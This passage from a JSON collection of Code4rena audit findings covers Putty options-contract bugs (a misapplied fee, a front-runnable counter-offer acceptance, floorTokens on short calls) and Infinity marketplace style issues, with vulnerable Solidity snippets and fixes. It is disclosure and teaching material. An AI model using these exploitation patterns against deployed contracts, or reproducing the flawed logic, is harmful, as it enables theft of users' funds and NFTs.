above.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1178995764):**\n > Report: Short call with floorTokens will result in a revert when exercising.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1181790939):**\n > Agreed, all wardens gave the same scenario that leads to a direct loss of NFTs and premium, but @STYJ's exploit scenario raises the gravity of the situation since users can be griefed.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/369#issuecomment-1185411060):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/1.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by prohibiting non-empty `order.floorTokens` for short calls.\n >\n > Other option types do need `floorTokens`: long calls' taker provides floor tokens on filling, while long put owner brings in the floor tokens on exercise, taking the strike. Short put owner can thereafter retrieve the tokens on withdraw.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PuttyV2.sol code on the code-423n4/2022-06-putty repository. If a short call order is created with a non-empty floorTokens array, the taker cannot exercise the option and the maker cannot withdraw after the expiration. This means that both parties lose out: the taker loses premium without possible exercise, and the maker loses the locked ERC20s and ERC721s. The proof of concept provided shows two scenarios: the first is where the input floorAssetTokenIds are checked to be empty for put orders, but the call passes this requirement and eventually causes an Index out of bounds error. The second is where the input floorAssetTokenIds are checked to be empty, but are not empty and thus revert. After expiration, the maker trying to withdraw also fails due to the same issue. The tools used to discover this bug were foundry. The recommended mitigation steps are to ensure that the fillOrder does not have a non-empty floorTokens array when the order is a short call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/369",
      "tags": [],
      "finders": [
        "danb",
        "Metatron",
        "minhquanym",
        "zzzitron",
        "Kenshin",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2931",
      "title": "[H-02] acceptCounterOffer() May Result In Both Orders Being Filled",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584\n\n\n## Vulnerability details\n\n## Impact\n\nWhen a user is attempting to accept a counter offer they call the function [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) with both the `originalOrder` to be cancelled and the new `order` to fill. It is possible for an attacker (or any other user who happens to call `fillOrder()` at the same time) to fill the `originalOrder` before `acceptCounterOffer()` cancels it.\n\nThe impact is that both `originalOrder` and `order` are filled. The `msg.sender` of `acceptCounterOffer()` is twice as leveraged as they intended to be if the required token transfers succeed.\n\n## Proof of Concept\n\n[acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) calls `cancel()` on the original order, however it will not revert if the order has already been filled.\n```solidity\n    function acceptCounterOffer(\n        Order memory order,\n        bytes calldata signature,\n        Order memory originalOrder\n    ) public payable returns (uint256 positionId) {\n        // cancel the original order\n        cancel(originalOrder);\n\n\n        // accept the counter offer\n        uint256[] memory floorAssetTokenIds = new uint256[](0);\n        positionId = fillOrder(order, signature, floorAssetTokenIds);\n    }\n```\n\n[cancel()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526-L535) does not revert if an order has already been filled it only prevents future `fillOrder()` transactions from succeeding.\n```solidity\n    function cancel(Order memory order) public {\n        require(msg.sender == order.maker, \"Not your order\");\n\n\n        bytes32 orderHash = hashOrder(order);\n\n\n        // mark the order as cancelled\n        cancelledOrders[orderHash] = true;\n\n\n        emit CancelledOrder(orderHash, order);\n    }\n```\n\nTherefore any user may front-run the `acceptCounterOffer()` transaction with a `fillOrder()` transaction that fills the original order. As a result the user ends up filling both `order` and `originalOrder`. Then `acceptCounterOffer()` cancels the `originalOrder` which is essentially a no-op since it's been filled and continues to fill the new `order` resulting in both orders being filled.\n\n## Recommended Mitigation Steps\n\nConsider having `cancel()` revert if an order has already been filled. This can be done by adding the following line `require(_ownerOf[uint256(orderHash)] == 0)`.",
      "summary": "\nThis bug report is about a vulnerability in the PuttyV2.sol smart contract. When a user attempts to accept a counter offer, it is possible for an attacker or any other user to fill the original order before the acceptCounterOffer() function cancels it. This means both the original order and the new order will be filled, leaving the user twice as leveraged as they intended to be. The vulnerability is caused by the cancel() function not reverting if an order has already been filled. To mitigate this vulnerability, the cancel() function should be modified to revert if an order has already been filled by adding the line \"require(_ownerOf[uint256(orderHash)] == 0)\".",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/44",
      "tags": [],
      "finders": [
        "csanuragjain",
        "minhquanym",
        "Lambda",
        "kirk-baird",
        "hansfriese"
      ]
    },
    {
      "id": "2930",
      "title": "[H-01] Fee is being deducted when Put is expired and not when it is exercised.",
      "impact": "HIGH",
      "content": "_Submitted by zishansami, also found by 0x52, 0xsanson, auditor0517, berndartmueller, csanuragjain, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495-L503>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451>\n\n### Impact\n\nFee is being deducted when Put is expired and not when it is exercised in `PuttyV2.sol`.\nComment section of the `setFee()` function mentions `\"fee rate that is applied on exercise\"` which signifies that the fee amount is meant to be deducted from strike only when a position is being exercised (or has been exercised).\n\nBut, in function `withdraw()` at [PuttyV2.solL#495-L503](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495-L503)  the fee is being deducted even when the Put position is not exercised and has expired.\n\nAlso, in function `exercise()` there is no fee deduction from the `order.strike` when the Put position is exercised and the strike is being transferred to the caller ([PuttyV2.solL#451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451)).\n\nThis unintended deduction from assets of Put Shorter and the absence of fee deduction from strike when Put is exercised are directly impacting the assets and therefore marked as Medium Risk.\n\n### Proof of Concept\n\n`if` condition present at [PuttyV2.solL#495](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L495) passes if `order.isCall` is `false` and `isExercised` is false.\n\n`feeAmount` becomes positive if `fee > 0` and it gets deducted from the `order.strike` which gets transferred to `msg.sender` at line number [PuttyV2.solL#503](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L503).\n\n### Recommended Mitigation Steps\n\n1.  Update `if` condition at [PuttyV2.sol#L498](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L498) with `(fee > 0 && order.isCall && isExercised)`\n\n2.  Add feeAmount calculation and deduction after put is exercised and strike is transferred at [PuttyV2.sol#L451](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L451) as follows:\n\n```solidity\nuint256 feeAmount = 0;\nif (fee > 0) {\n    feeAmount = (order.strike * fee) / 1000;\n    ERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n}\nERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n```\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/269#issuecomment-1178999683):**\n > Report: Fees are only applied on puts if they are expired.\n\n**[HickupHH3 (judge) increased severity to High and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/269#issuecomment-1179899567):**\n > Due to incorrect logic, there are 2 consequences of separate severities:\n> \n> 1) Expired put option being charged the admin fee. As @berndartmueller mentioned in [#380](https://github.com/code-423n4/2022-06-putty-findings/issues/380), the fee should be charged on the premium (actually this is another issue, see [#373](https://github.com/code-423n4/2022-06-putty-findings/issues/373)). Since it is possible for the fee amount to be greater than expected, I consider this to be a loss of assets and therefore given a high severity rating.\n> \n> 2) Put option not being charged fee upon exercising it. This can be considered to the \"protocol leaked value\" and thus be given a medium severity rating.\n> \n> Issues that mention (1) or both (1) and (2) will be given a high severity rating, those that mention only (2) will be given a medium.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/269#issuecomment-1185405136):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by changing the fee base to be `order.premium` [`PR#4`](https://github.com/outdoteth/putty-v2/pull/4), which is now paid uniformly for all option types on order filling. Utilizing `order.strike` as the fee base was the root cause for [M-04](https://github.com/code-423n4/2022-06-putty-findings/issues/285), [M-06](https://github.com/code-423n4/2022-06-putty-findings/issues/296), [M-11](https://github.com/code-423n4/2022-06-putty-findings/issues/422), [M-15](https://github.com/code-423n4/2022-06-putty-findings/issues/373), so the change to `order.premium` was a shared mitigation for all of them.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of PuttyV2.sol, a contract written in the Solidity programming language. The vulnerability affects how fees are deducted when a Put position is exercised or expired. The code shows that fees are deducted when the position is expired, but not when it is exercised. This unintended deduction of assets from Put Shorter and the absence of fee deduction from strike when Put is exercised are directly impacting the assets and therefore marked as Medium Risk.\n\nTo fix this vulnerability, it is recommended to update the if condition at PuttyV2.sol#L498 with (fee > 0 && order.isCall && isExercised). Additionally, feeAmount calculation and deduction should be added after the Put is exercised and the strike is transferred at PuttyV2.sol#L451.\n\nThis bug report was done using manual analysis.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/269",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "csanuragjain",
        "0x52",
        "0xsanson",
        "auditor0517",
        "zishansami",
        "berndartmueller",
        "zzzitron"
      ]
    },
    {
      "id": "24283",
      "title": "[N-08] Scientific notation",
      "impact": "LOW",
      "content": "\nFor readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`)\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[uint32 public WETH_TRANSFER_GAS_UNITS = 50000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L61)\\\n[20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L202)\\\n[1000000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L381)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L819)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L873)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1135)\\\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1161)\n\n#### InfinityOrderBookComplication.sol\n\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L338)\n\n#### InfinityStaker.sol\n\n[uint16 public BRONZE_STAKE_THRESHOLD = 1000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L33)\\\n[uint16 public SILVER_STAKE_THRESHOLD = 5000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L34)\\\n[uint16 public GOLD_STAKE_THRESHOLD = 10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L35)\\\n[uint16 public PLATINUM_STAKE_THRESHOLD = 20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L36)\\\n[10\\*\\*18](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L237)\n\n### Mitigation\n\nReplace the numbers aforementioned with their scientific notation\n\n**[nneverlander (Infinity) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/299#issuecomment-1163395467):**\n > Thanks\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/299#issuecomment-1183717266):**\n > I love how you name the inlined links -- really improves the readability.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24282",
      "title": "[N-07] Related data should be grouped in struct",
      "impact": "LOW",
      "content": "\nWhen there are mappings that use the same key value, having separate fields is error prone, for instance in case of deletion or with future new fields.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n    mapping(address => uint256) public userMinOrderNonce;\n    mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n### Mitigation\n\nGroup the related data in a struct and use one mapping:\n\n    struct OrderNonce {\n      uint256 userMin;\n      mapping(uint256 => bool) isExecutedOrCancelled;\n    }\n\nAnd it would be used as a state variable:\n\n    mapping(address =>  OrderNonce) orderNonces;\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24281",
      "title": "[N-06] Public functions can be external",
      "impact": "LOW",
      "content": "\nIt is good practice to mark functions as `external` instead of `public` if they are not called by the contract where they are defined.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[function getUserTotalStaked()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L154)\\\n[function getUserTotalVested()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L154)\n\n### Mitigation\n\nDeclare these functions as `external` instead of `public`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24280",
      "title": "[N-05] Function missing comments",
      "impact": "LOW",
      "content": "\nSome functions are missing comments.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[function \\_emitMatchEvent](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L922)\\\n[function \\_emitTakerEvent](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1005)\\\n[function \\_nftsHash](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1185)\\\n[function \\_tokensHash](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1201)\n\n#### InfinityStaker.sol\n\n[function \\_getDurationInSeconds](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L275)\n\n#### InfinityToken.sol\n\n[function advanceEpoch()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L60)\\\n[function \\_beforeTokenTransfer()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L86)\\\n[function \\_afterTokenTransfer()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L95)\\\n[function \\_mint()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L103)\\\n[function \\_burn()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L107)\\\n[function getAdmin()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L113)\\\n[function getTimelock()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L117)\\\n[function getInflation()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L121)\\\n[function getCliff()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L125)\\\n[function getMaxEpochs()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L129)\\\n[function getEpochDuration()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L133)\n\n### Mitigation\n\nAdd comments to these functions\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24279",
      "title": "[N-04] Events indexing",
      "impact": "LOW",
      "content": "\nEvents should use indexed fields\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[event CancelAllOrders(address user, uint256 newMinNonce)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L80)\\\n[event CancelMultipleOrders(address user, uint256\\[\\] orderNonces)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L81)\\\n[event NewWethTransferGasUnits(uint32 wethTransferGasUnits))](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L82)\\\n[event NewProtocolFee(uint16 protocolFee)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L83)\\\n[event MatchOrderFulfilled(bytes32 sellOrderHash,bytes32 buyOrderHash,address seller,address buyer,address complication, // address of the complication that defines the execution ,address currency, // token address of the transacting currency,uint256 amount // amount spent on the order)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L85-L92)\\\n[event TakeOrderFulfilled(bytes32 orderHash,address seller,address buyer,address complication, // address of the complication that defines the executionaddress currency, // token address of the transacting currencyuint256 amount // amount spent on the order)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L95-L102)\n\n#### InfinityStaker.sol\n\n[ event Staked(address indexed user, uint256 amount, Duration duration)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L44)\\\n[event DurationChanged(address indexed user, uint256 amount, Duration oldDuration, Duration newDuration)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L45)\\\n[event UnStaked(address indexed user, uint256 amount)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L46)\\\n[event RageQuit(address indexed user, uint256 totalToUser, uint256 penalty)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L47)\n\n#### InfinityToken.sol\n\n[event EpochAdvanced(uint256 currentEpoch, uint256 supplyMinted)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L35)\n\n### Mitigation\n\nAdd indexed fields to these events so that they have the maximum number of indexed fields possible.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24278",
      "title": "[N-03] Constants instead of magic numbers",
      "impact": "LOW",
      "content": "\nIt is best practice to use constant variables rather than literal values to make the code easier to understand and maintain.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L202)\\\n[1000000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L381)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L819)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L873)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1135)\\\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1161)\n\n#### InfinityOrderBookComplication.sol\n\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L338)\n\n#### InfinityStaker.sol\n\n[10\\*\\*18](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L237)\n\n### Mitigation\n\nDefine constant variables for the literal values aforementioned.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24277",
      "title": "[N-02] Commented code",
      "impact": "LOW",
      "content": "\nThere are portions of commented code in some files.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[line 1169](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1169)\\\n[line1186](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1186)\\\n[line1202](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1202)\n\n### Mitigation\n\nRemove commented code\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24276",
      "title": "[N-01] Comment Missing function parameter",
      "impact": "LOW",
      "content": "\nSome of the function comments are missing function parameters or returns\n\n### Proof Of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[bool verifySellOrder](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L462)\\\n[uint256 execPrice](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L677)\\\n[address seller,address buyer,OrderTypes.OrderItem\\[\\] calldata constructedNfts,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L835-L840)\\\n[address seller,address buyer,uint256 sellNonce,uint256 buyNonce,OrderTypes.OrderItem\\[\\] calldata constructedNfts,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L905-L912)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1153)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1168)\\\n[address destination,address currency,uint256 amount](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1220-L1223)\\\n[address destination](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1229)\n\n#### InfinityOrderBookComplication.sol\n\n[OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L169)\\\n[OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L182)\\\n[OrderTypes.MakerOrder calldata sell,OrderTypes.MakerOrder calldata buy,OrderTypes.OrderItem\\[\\] calldata constructedNfts](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L182-L195)\\\n[OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem\\[\\] calldata takerItems](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L209)\\\n[OrderTypes.MakerOrder\\[\\] calldata orders](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L317)\\\n[OrderTypes.MakerOrder calldata order](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L330)\n\n#### InfinityStaker.sol\n\n[address user,uint256 amount,uint256 noVesting,uint256 vestedThreeMonths,uint256 vestedSixMonths,uint256 vestedTwelveMonths](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L291-L296)\\\n[address user](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L328)\\\n[address destination](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L345)\\\n[StakeLevel stakeLevel, uint16 